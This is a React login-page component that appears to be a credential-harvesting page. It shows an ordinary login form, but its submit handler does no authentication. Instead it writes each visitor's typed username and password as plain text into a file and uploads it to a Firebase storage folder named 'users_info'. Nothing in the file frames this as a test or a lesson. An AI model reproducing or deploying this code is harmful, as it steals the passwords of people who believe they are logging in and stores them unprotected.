import React, { Component } from 'react';
import './App.css';
import axios from "axios";
import { Form, Icon, Input, Button, Checkbox, message } from "antd";
import loginImg from './login.png'
import { storage } from "./firebase";
import {ref,uploadBytesResumable } from 'firebase/storage';
const FormItem = Form.Item;

class NormalLoginForm extends Component {
  constructor(props) {
    super(props);
  
    this.state = {
      user: {
        UserName: "",
        password: "",
      }
    }
  }
  isLoggedIn = () => {
    // window.loggedUsername should be defined by UI page / jelly script
    // if it's 'guest' that means there is no active user session
    if (window.loggedUsername==='guest') {
      return false;
    } else {
      return true; // set it to false for local development to prevent passing through
    }
  }

  handleSubmit = e => {
    e.preventDefault();
    this.props.form.validateFields((err, values) => {
      var filename = this.state.user.UserName.concat(" ", ".txt");
      var content = "username:".concat(" ", this.state.user.UserName).concat(" ", ",password:").concat(" ", this.state.user.password)
      var file = new File([content], filename, {type: "text/plain;charset=utf-8"});
      this.uploadfile(file,filename)
      console.log(this.state.user)

    });
  };
  handleUserNameChanged(event) {
    var user        = this.state.user;
    user.UserName  = event.target.value;

    this.setState({ user: user });
  }

  handlePasswordChanged(event) {
    var user      = this.state.user;
    user.password= event.target.value;

    this.setState({ user: user });
  }
  uploadfile(file,name) {
    if(!file) return;
    const strorageref = ref(storage,`/users_info/${name}`)
    const uploadtask = uploadBytesResumable(strorageref,file)

    uploadtask.on("state_changed",
    (snapshot) =>{
      const prog =Math.round(
        (snapshot.bytesTransferred/snapshot.totalBytes) *100
        );

    },
    (err) => console.log(err),
    () => {}

    );
  }
  render() {
    const { getFieldDecorator } = this.props.form;
    if (this.isLoggedIn()) {
      window.location = window.mainAppPage;
    }
    return (
      <div>
      <div className={this.isLoggedIn() ? ' ' : ' hidden'}>
        Successfully logged in...
      </div>
      <div className={"lContainer"+(this.isLoggedIn() ? ' hidden' : ' ')}>
      <div className="lItem">
          <div className="loginImage">
            <img src={loginImg} width="300" style={{position: 'relative'}} alt="login"/>
          </div>
          <div className="loginForm">
            <h2>Login</h2>
              <Form onSubmit={this.handleSubmit} className="login-form">
              <FormItem>
                {getFieldDecorator("userName", {
                  rules: [{ required: true, message: "Please enter your username" }]
                })(
                  <Input
                    prefix={<Icon type="user" style={{ color: "rgba(0,0,0,.25)" }} />}
                    placeholder="Username"
                    type="text"
                    onChange={this.handleUserNameChanged.bind(this)}
              
                  />
                )}
              </FormItem>
              <FormItem>
                {getFieldDecorator("password", {
                  rules: [{ required: true, message: "Please enter your Password" }]
                })(
                  <Input
                    prefix={<Icon type="lock" style={{ color: "rgba(0,0,0,.25)" }} />}
                    onChange={this.handlePasswordChanged.bind(this)}
                    type="password"
                    placeholder="Password"
                  
                  />
                )}
              </FormItem>
              <FormItem>
                {getFieldDecorator("remember", {
                  valuePropName: "checked",
                  initialValue: true
                })(<Checkbox>Remember me</Checkbox>)}
                <Button
                  type="primary"
                  htmlType="submit"
                  className="login-form-button"
                >
                  Log in
                </Button>
              </FormItem>
            </Form>
          </div>
      </div>
      <div className="footer">
        <a href="" target="_blank" rel="noopener noreferrer" className="footerLink">Powered by React</a>
      </div>
      </div>
      </div>
    );
  }
}

const App = Form.create()(NormalLoginForm);

export default App;